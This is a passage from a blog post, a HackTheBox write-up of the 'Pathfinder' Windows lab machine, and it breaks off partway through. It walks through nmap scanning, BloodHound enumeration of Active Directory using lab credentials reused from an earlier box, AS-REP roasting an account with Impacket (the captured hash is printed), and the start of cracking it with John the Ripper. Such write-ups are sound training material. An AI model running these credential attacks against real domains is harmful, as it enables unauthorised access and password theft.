@@ -1,0 +1,383 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox write-up: Pathfinder" /><meta name="author" content="ib4rz" /><meta property="og:locale" content="en" /><meta name="description" content="This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their “Starting Point” series." /><meta property="og:description" content="This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their “Starting Point” series." /><link rel="canonical" href="https://ib4rz.github.io/posts/HTB-Pathfinder/" /><meta property="og:url" content="https://ib4rz.github.io/posts/HTB-Pathfinder/" /><meta property="og:site_name" content="ib4rz" /><meta property="og:image" content="https://ib4rz.github.io/assets/img/Pathfinder/Pathfinder.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-09-25T17:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://ib4rz.github.io/assets/img/Pathfinder/Pathfinder.png" /><meta property="twitter:title" content="HackTheBox write-up: Pathfinder" /><meta name="twitter:site" content="@ib4rz" /><meta name="twitter:creator" content="@ib4rz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"ib4rz"},"dateModified":"2021-09-25T17:00:00+02:00","datePublished":"2021-09-25T17:00:00+02:00","description":"This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their “Starting Point” series.","headline":"HackTheBox write-up: Pathfinder","image":"https://ib4rz.github.io/assets/img/Pathfinder/Pathfinder.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://ib4rz.github.io/posts/HTB-Pathfinder/"},"url":"https://ib4rz.github.io/posts/HTB-Pathfinder/"}</script><title>HackTheBox write-up: Pathfinder | ib4rz</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ib4rz"><meta name="application-name" content="ib4rz"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ib4rz</a></div><div class="site-subtitle font-italic">Hack The Box write-ups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ib4rz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ib4rz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['albert.ibars','outlook.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox write-up: Pathfinder</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HackTheBox write-up: Pathfinder</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1632582000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 25, 2021 </em> </span><div class="mt-3 mb-3"> <img data-src="/assets/img/Pathfinder/Pathfinder.png" class="preview-img bg" alt="Preview Image" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> ib4rz </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1987 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their “Starting Point” series.</p><h2 id="basic-information"><span class="mr-2">Basic Information</span><a href="#basic-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Machine IP: <strong>10.10.10.30</strong> <br /> Type: <strong>Windows</strong> <br /> Difficulty: <strong>Very Easy</strong></p><h2 id="scanning"><span class="mr-2">Scanning</span><a href="#scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>First, to find interesting open ports, let’s do some reconnaissance and scanning using <a href="https://nmap.org/">nmap</a>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.30
+</pre></table></code></div></div><p>Parameters explanation:</p><ul><li><em>p-</em>: Scan all 65,535 possible port numbers.<li><em>open</em>: Only show open (or possibly open) ports.<li><em>T5</em>: Faster scan <em>(T&lt;0-5&gt;)</em>.<li><em>v</em>: Increase verbosity level.<li><em>n</em>: Never do DNS resolution.</ul><p>It seems to take a long time to scan. Let’s examine it in a faster way.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.10.30
+</pre></table></code></div></div><p>Parameters explanation:</p><ul><li><em>sS</em>: TCP SYN scan.<li><em>min-rate</em>: Send packets no slower than &lt;number&gt; per second.<li><em>p-</em>: Scan all 65,535 possible port numbers.<li><em>open</em>: Only show open (or possibly open) ports.<li><em>vvv</em>: Increase verbosity level.<li><em>Pn</em>: Treat all hosts as online and skip host discovery.</ul><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-Pn</span> 10.10.10.30
+<span class="go">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:48 CEST
+Initiating Parallel DNS resolution of 1 host. at 14:48
+Completed Parallel DNS resolution of 1 host. at 14:48, 1.09s elapsed
+</span><span class="gp">DNS resolution of 1 IPs took 1.09s. Mode: Async [#</span>: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+<span class="go">Initiating SYN Stealth Scan at 14:48
+Scanning 10.10.10.30 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.30
+Discovered open port 53/tcp on 10.10.10.30
+Discovered open port 135/tcp on 10.10.10.30
+Discovered open port 139/tcp on 10.10.10.30
+Discovered open port 49676/tcp on 10.10.10.30
+Discovered open port 464/tcp on 10.10.10.30
+Discovered open port 389/tcp on 10.10.10.30
+Discovered open port 49677/tcp on 10.10.10.30
+Discovered open port 49698/tcp on 10.10.10.30
+Discovered open port 593/tcp on 10.10.10.30
+Discovered open port 5985/tcp on 10.10.10.30
+Discovered open port 3269/tcp on 10.10.10.30
+Discovered open port 49718/tcp on 10.10.10.30
+Discovered open port 49666/tcp on 10.10.10.30
+Discovered open port 9389/tcp on 10.10.10.30
+Discovered open port 3268/tcp on 10.10.10.30
+Discovered open port 636/tcp on 10.10.10.30
+Discovered open port 49667/tcp on 10.10.10.30
+Discovered open port 88/tcp on 10.10.10.30
+Completed SYN Stealth Scan at 14:49, 26.37s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.30
+Host is up, received user-set (0.038s latency).
+Scanned at 2021-09-21 14:48:35 CEST for 26s
+Not shown: 65516 filtered ports
+Reason: 65516 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49698/tcp open  unknown          syn-ack ttl 127
+49718/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
+           Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.452KB)
+</span></pre></table></code></div></div><p>We see that the machine has many open ports.</p><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>We can run <code class="language-plaintext highlighter-rouge">Nmap Scripting Engine</code> for service/version detection running through each port for the best results.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30
+</pre></table></code></div></div><p>Parameters explanation:</p><ul><li><em>sV</em>: Service fingerprinting.<li><em>sC</em>: Launch default NSE nmap scripts.<li><em>p</em>: Only scan specified ports.</ul><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:51 CEST
+Nmap scan report for 10.10.10.30
+Host is up (0.097s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-21 19:59:56Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49718/tcp open  msrpc         Microsoft Windows RPC
+</span><span class="gp">Service Info: Host: PATHFINDER;</span><span class="w"> </span>OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+<span class="go">
+Host script results:
+|_clock-skew: 7h08m17s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-09-21T20:00:50
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.32 seconds
+</span></pre></table></code></div></div><p>Relevant information:</p><div class="table-wrapper"><table><thead><tr><th>Port<th>Service<th>Version<tbody><tr><td>88<td>kerberos-sec<td>Microsoft Windows Kerberos<tr><td>389<td>ldap<td>Microsoft Windows Active Directory LDAP<tr><td>3268<td>ldap<td>Microsoft Windows Active Directory LDAP<tr><td>5985<td>http<td>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</table></div><p>So, on port 88, there’s <strong>Kerberos</strong> running, a network authentication protocol designed to provide strong authentication for client/server applications using secret-key cryptography.</p><p>Ports 389, 3268 with <strong>LDAP</strong>. A mature, flexible, and well-supported standards-based mechanism for interacting with directory servers.</p><p>Port 5985 uses <strong>WinRM HTTP</strong>, a Windows-native built-in remote management protocol in its simplest form that uses <em>SOAP</em> to interface with remote computers and servers.</p><h2 id="vulnerability-analysis--exploitation"><span class="mr-2">Vulnerability Analysis &amp; Exploitation</span><a href="#vulnerability-analysis--exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="enumeration-active-directory"><span class="mr-2">Enumeration (Active Directory)</span><a href="#enumeration-active-directory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><hr /><blockquote class="prompt-info"><div><p>As usual on these “Starting Point” machines, credentials are reused from previous machines.</p></div></blockquote><p>We will use Sandra’s credentials extracted during the last <a href="https://ib4rz.github.io/posts/HTB-Shield/">Shield</a> box. So we can attempt to enumerate Active Directory using BloodHund.</p><blockquote class="prompt-info"><div><p>There is a python bloodhound ingester, which can be found <a href="https://github.com/fox-it/BloodHound.py">here</a>. It can also be installed using pip: <code class="language-plaintext highlighter-rouge">pip install bloodhound</code>.</p></div></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>bloodhound-python <span class="nt">-u</span> sandra <span class="nt">-p</span> Password1234! <span class="nt">-d</span> MEGACORP.LOCAL <span class="nt">-c</span> all <span class="nt">-ns</span> 10.10.10.30
+</pre></table></code></div></div><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>bloodhound-python <span class="nt">-u</span> sandra <span class="nt">-p</span> Password1234! <span class="nt">-d</span> MEGACORP.LOCAL <span class="nt">-c</span> all <span class="nt">-ns</span> 10.10.10.30
+<span class="go">
+INFO: Found AD domain: megacorp.local
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 5 users
+INFO: Connecting to GC LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 51 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
+INFO: Done in 00M 10S
+</span></pre></table></code></div></div><p>This execution will store four <em>json</em> files in the current directory, which it will later import into Bloodhound.</p><p>The next step is to install and configure the <a href="https://neo4j.com/">neo4j</a> service, which is an open-source graph database.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>apt <span class="nb">install </span>neo4j
+<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>neo4j console
+</pre></table></code></div></div><p>Afterwards, go to <code class="language-plaintext filepath highlighter-rouge">localhost:7474</code>, connect to the database with the credentials <code class="language-plaintext highlighter-rouge">neoj4:n4oj4</code>, and you will be prompted to change your password.</p><p><img data-src="/assets/img/Pathfinder/neo4j.png" alt="Desktop View" data-proofer-ignore></p><p>Next, we start BloodHound.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>bloodhound <span class="nt">--no-sandbox</span>
+</pre></table></code></div></div><p>Ensure you connect to the database, indicated by a ✔️ symbol at the top of the three input fields. The default username is neo4j, with the password previously set.</p><p><img data-src="/assets/img/Pathfinder/bloodhound.png" alt="Desktop View" data-proofer-ignore></p><p>Opening BloodHound, we can drag and drop the <em>.json</em> files, and BloodHound will begin to analyze the data.</p><p><img data-src="/assets/img/Pathfinder/upload.png" alt="Desktop View" data-proofer-ignore></p><h3 id="analysis"><span class="mr-2">Analysis</span><a href="#analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><hr /><p>BloodHound offers several Pre-Built Analysis queries.</p><p><img data-src="/assets/img/Pathfinder/analysis.png" alt="Desktop View" data-proofer-ignore></p><p>We can select various queries, of which some handy ones are <code class="language-plaintext highlighter-rouge">Shortest Paths to High value Targets</code> and <code class="language-plaintext highlighter-rouge">Find Principles with DCSync Rights</code>.</p><p><strong>Shortest Paths from Domain Users to High Value Targets</strong></p><p><img data-src="/assets/img/Pathfinder/bloodhound1.png" alt="Desktop View" data-proofer-ignore></p><p><strong>Find Principles with DCSync Rights</strong></p><p><img data-src="/assets/img/Pathfinder/bloodhound2.png" alt="Desktop View" data-proofer-ignore></p><p>While the latter query returns this:</p><p>We can see that the <code class="language-plaintext highlighter-rouge">svc_bes</code> has <code class="language-plaintext highlighter-rouge">GetChangesAll</code> privileges to the domain. This means the account can request replication data from the domain controller and gain sensitive information such as user hashes.</p><h3 id="explotation"><span class="mr-2">Explotation</span><a href="#explotation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><hr /><p>It’s worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to <code class="language-plaintext highlighter-rouge">ASREPRoasting</code>.</p><blockquote class="prompt-tip"><div><p>We can check this using a tool such as Impacket’s <code class="language-plaintext highlighter-rouge">GetNPUsers</code> and grab the request service ticket.</p></div></blockquote><p>Type the following command to grab the request ticket.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes <span class="nt">-dc-ip</span> 10.10.10.30 <span class="nt">-request</span> <span class="nt">-no-pass</span>
+</pre></table></code></div></div><p>Parameters explanation:</p><ul><li><em>request</em>: Requests TGT for users and output them in JtR/hashcat format (default False).<li><em>no-pass</em>: Don’t ask for password (useful for Kerberos authentication).<li><em>dc-ip</em>: IP Address of the domain controller.<li><em>format</em>: Format to save the AS_REQ of users without pre-authentication. Default is hashcat.</ul><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes <span class="nt">-dc-ip</span> 10.10.10.30 <span class="nt">-request</span> <span class="nt">-no-pass</span>
+<span class="go">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for svc_bes
+</span><span class="gp">$</span>krb5asrep<span class="nv">$23$svc_bes</span>@MEGACORP.LOCAL:8576c42381f7fdd8c60f78915def4303<span class="nv">$c93a0b635c08240ed73a946bdeb03968c238f8f3907a9c0d72126cd65953335f4e014c200dd27c54d709fb737a1d9a452c6719f5e1250fd7c7ace2579636e628eb2bec468920bc07e191909af1af774cc9b142573e008558362ffae11f56e5014852dafd4703f0d95aa4ed9044f95db8d5b473c51f8cf6a254ff708bc88ab70d071ca6f9012e330a1b5e56b1c1ecdda69764317a284af5531763d9d278ccc4cd77da7891bfbccce6bc7064bf462f5baa22bf78895e19d860cf12237c63da47c10643f46cd119617990ef4ec9afa605ee7e8a72bb881192c28813eb7d1b11d144589a2a5f480429eef52e46a90537e890</span>
+</pre></table></code></div></div><p>We grabbed the ticket. Now it’s time to power up <a href="https://www.openwall.com/john/">John the Ripper</a> and crack the hash. First, copy that hash to the file, then run the john.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</pre></table></code></div></div><p>This outputs:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<span class="go">Using default input encoding: UTF-8
